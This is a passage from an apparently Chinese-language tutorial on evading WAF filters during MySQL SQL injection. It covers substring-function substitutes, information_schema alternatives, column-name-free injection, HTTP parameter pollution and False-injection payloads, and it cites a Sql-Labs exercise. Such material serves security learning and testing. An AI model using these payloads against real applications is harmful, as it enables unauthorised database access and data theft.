    select substr((select database()) from 4);    # urity
    select substr((select database()) from 5);    # rity
    select substr((select database()) from 6);    # ity
    select substr((select database()) from 7);    # ty
    select substr((select database()) from 8);    # y
    # 也可以使用负数来倒着截取:
    select substr((select database())from(-1));    # y
    select substr((select database())from(-2));    # ty
    select substr((select database())from(-3));    # ity
    select substr((select database())from(-4));    # rity
    select substr((select database())from(-5));    # urity
    select substr((select database())from(-6));    # curity
    select substr((select database())from(-7));    # ecurity
    select substr((select database())from(-8));    # security
##### 使用offset关键字绕过
我们可以使用 `offset` 语句替换 limit 语句里的逗号：
    select * from users limit 1 offset 2;
    # 此时 limit 1 offset 2 可以代替 limit 1,2
##### 利用join与别名绕过
    select host,user from user where user='a'union(select*from((select`table_name`from`information_schema`.`tables`where`table_schema`='mysql')`a`join(select`table_type`from`information_schema`.`tables`where`table_schema`='mysql')b));
#### 过滤information_schema绕过与无列名注入 *
当过滤or时，这个库就会被过滤，那么mysql在被waf禁掉了information_schema库后还能有哪些利用思路呢？
information_schema
简单来说，这个库在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。在注入中，infromation_schema库的作用无非就是可以获取到table_schema、table_name、column_name这些数据库内的信息。
能够代替information_schema的有：
  * sys.schema_auto_increment_columns 只显示有自增的表
  * sys.schema_table_statistics_with_buffer
  * x$schema_table_statistics_with_buffer
        select * from user where id = -1 union all select 1,2,3,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database();
  * mysql.innodb_table_stats
  * mysql.innodb_table_index
以上大部分特殊数据库都是在 mysql5.7 以后的版本才有，并且要访问sys数据库需要有相应的权限。
但是在使用上面的后两个表来获取表名之后`select group_concat(table_name) from
mysql.innodb_table_stats`，我们是没有办法获得列的，这个时候就要采用无列名注入的办法。
#### 无列名注入
##### 123法
我们可以利用一些查询上的技巧来进行无列名、表名的注入。
在我们直接`select 1,2,3`时，会创建一个虚拟的表
如图所见列名会被定义为1，2，3
当我们结合了union联合查询之后
如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的
password，进而我们就可以构造这样的查询语句来查询password：
    select `3` from (select 1,2,3 union select * from users)a;
末尾的 a 可以是任意字符，用于命名
当然，多数情况下，反引号会被过滤。当反引号不能使用的时候，可以使用别名来代替：
    select b from (select 1,2,3 as b union select * from admin)a;
##### join
我们可以利用爆错，借助join和using爆出列名，id为第一列，username为第二列，可以逐个爆出，爆出全部列名之后即可得到列内数据。
#### 过滤其他关键字绕过
##### 过滤 if 语句绕过
如果过滤了 if 关键字的话，我们可以使用case when语句绕过：
    if(condition,1,0)  case when condition then 1 else 0 end
下面的if语句和case when语句是等效的：
    0' or if((ascii(substr((select database()),1,1))>97),1,0)#
    0' or case when ascii(substr((select database()),1,1))>97 then 1 else 0 end#
#### 过滤 substr 绕过
##### 使用 lpad/lpad
  * 使用lpad()和rpad()绕过substr()
    select lpad((select database()),1,1)    // s
    select lpad((select database()),2,1)    // se
    select lpad((select database()),3,1)    // sec
    select lpad((select database()),4,1)    // secu
    select lpad((select database()),5,1)    // secur
    select lpad((select database()),6,1)    // securi
    select lpad((select database()),7,1)    // securit
    select lpad((select database()),8,1)    // security
    select rpad((select database()),1,1)    // s
    select rpad((select database()),2,1)    // se
    select rpad((select database()),3,1)    // sec
    select rpad((select database()),4,1)    // secu
    select rpad((select database()),5,1)    // secur
    select rpad((select database()),6,1)    // securi
    select rpad((select database()),7,1)    // securit
    select rpad((select database()),8,1)    // security
lpad：函数语法：`lpad(str1,length,str2)`。其中str1是第一个字符串，length是结果字符串的长度，str2是一个填充字符串。如果str1的长度没有length那么长，则使用str2填充；如果str1的长度大于length，则截断。
rpad：同理
  * 使用left()绕过substr()
    select left((select database()),1)    // s
    select left((select database()),2)    // se
    select left((select database()),3)    // sec
    select left((select database()),4)    // secu
    select left((select database()),5)    // secur
    select left((select database()),6)    // securi
    select left((select database()),7)    // securit
    select left((select database()),8)    // security
  * 使用mid()绕过substr()
mid()函数的使用就和substr()函数一样了：
    select mid((select database()),1,1)    // s
    select mid((select database()),2,1)    // e
    select mid((select database()),3,1)    // c
    select mid((select database()),4,1)    // u
    select mid((select database()),5,1)    // r
    ......
  * 还可以使用下面这个神奇的东西绕过
    select insert(insert((select database()),1,0,space(0)),2,222,space(0));    // s
    select insert(insert((select database()),1,1,space(0)),2,222,space(0));    // e
    select insert(insert((select database()),1,2,space(0)),2,222,space(0));    // c
    select insert(insert((select database()),1,3,space(0)),2,222,space(0));    // u
    select insert(insert((select database()),1,4,space(0)),2,222,space(0));    // r
    select insert(insert((select database()),1,5,space(0)),2,222,space(0));    // i
    select insert(insert((select database()),1,6,space(0)),2,222,space(0));    // t
    ......
INSERT( _string_ , _position_ , _number_ , _string2_ )
INSERT()函数在指定位置的字符串中插入一个字符串，并插入一定数量的字符。
参数 | 描述  
---|---  
_string_ | 必须项。要修改的字符串  
_position_ | 必须项。插入 _string2_ 的位置  
_number_ | 必须项。要替换的字符数  
_string2_ | 必须项。要插入 _字符串的字符串_  
#### HTTP参数污染(HPP)漏洞绕过 Waf
HPP是HTTP Parameter
Pollution的缩写，意为HTTP参数污染。浏览器在跟服务器进行交互的过程中，浏览器往往会在GET或POST请求里面带上参数，这些参数会以 键-值
对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。
但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：`http://www.baidu.com?name=aa&name=bb`，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是
`name=aa`。有的服务器是取第二个参数，也就是 `name=bb`。有的服务器两个参数都取，也就是
`name=aa,bb`。这种特性在绕过一些服务器端的逻辑判断时，非常有用。
HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同类型的Web服务器对于出现多个参数时的选择：
**Web 服务器** | **参数获取函数** | **获取到的参数**  
---|---|---  
**PHP/Apache** | $_GET['a'] | Last  
**JSP/Tomcat** | Request.getParameter('a') | First  
**Perl(CGI)/Apache** | Param('a') | First  
**Python/Apache** | getvalue('a') | All  
**ASP/IIS** | Request.QueryString('a') | All  
假设服务器端有两个部分：第一部分是Tomcat为引擎的JSP/Tomcat型服务器，第二部分是Apache为引擎的PHP/Apache型服务器。第一部分的JSP/Tomcat服务器处做数据过滤和处理，功能类似为一个WAF，而真正提供Web服务的是PHP/Apache服务器。那么服务端的工作流程为：客户端访问服务器，能直接访问到JSP/Tomcat服务器，然后JSP/Tomcat服务器再向PHP/Apache服务器请求数据。数据返回路径则相反。
那么此时我们便可以利用不同服务器解析参数的位置不同绕过WAF的检测。来看看如下请求：
    index.jsp?id=1&id=2
客户端请求首先过JSP/Tomcat服务器，JSP/Tomcat服务器解析第一个参数，接下来JSP/Tomcat服务器去请求PHP/Apache服务器，PHP/Apache服务器解析最后一个参数。假设JSP/Tomcat服务器作为Waf对第一个参数进行检测，那我们便可以在第二个参数中传payload来绕过Waf。如下所示：
    /index.jsp?id=1&id=-1' union select 1,database(),3--+
这样 Waf 可能只检测第一个参数 `id=1`，而PHP脚本真正识别的是 `id=select database()--+`
[例题]Sql-Labs Less-29
#### False 注入绕过
##### False 注入原理
前面我们学过的注入都是基于1=1这样比较的普通注入，下面来说一说 False 注入，利用 False 我们可以绕过一些特定的 WAF
以及一些未来不确定的因素。
首先我们来看一看下面这个sql查询语句：
    select * from user where uesrname = 0;
为什么 `username = 0` 会导致返回数据，而且是全部数据呢？
这就是一个基于 False 注入的例子，下面再举一个例子：
    select * from user where username = 0;
和上面是同一个表，但是为什么这里只返回了两组数据呢？说到这里不得不说一说有关于 MYSQL 的隐式类型转换。
MYSQL
的隐式类型转换，即当字符串和数字比较时，会把字符串转为浮点数，而字符串转换为浮点数很明显会转换失败，这时就会产生一个warning，转换的结果为0，然后`0
= 0` 返回的是 `True`
，这样就将表中的数据全部返回了。但如果字符串开头是数字话还是会从数字部分截断，转换为数字进行比较，在第二个例子中，passwd
字段中有一个值是以数字1开头的并非为0，再进行 `passwd = 0` 比较时，会从1开始截断，`1 = 0` 不成立，当然就只返回两条数据了。这就是
MYSQL False 注入的原理。
##### False 注入利用
下面我们讲讲 False 注入如何利用，及如何构造 False 注入的利用点。在实际中我们接触到的语句都是带有引号的，如下：
    select * from user where username ='.$username.';
在这种情况下，我们如何绕过引号构造出 0 这个值呢，我们需要做一些处理来构造false注入的 **利用点** ？
可以使用的姿势有很多，比如下面的算数运算：
  * 利用算数运算
加：+
    插入'+', 拼接的语句: select * from user where username =''+'';
减：-
    插入'-', 拼接的语句: select * from user where username =''-'';
乘：*
    插入'*', 拼接的语句: select * from user where username =''*'';
除：/
    插入'/6#, 拼接的语句: select * from user where username =''/6#';
取余：%
    插入'%1#, 拼接的语句: select * from user where username =''%1#';
  * 利用位操作运算
我们还可以使用当字符串和数字运算的时候类型转换的问题进行利用。
和运算：&
    插入'&0#, 拼接的语句: select * from user where username =''&0#';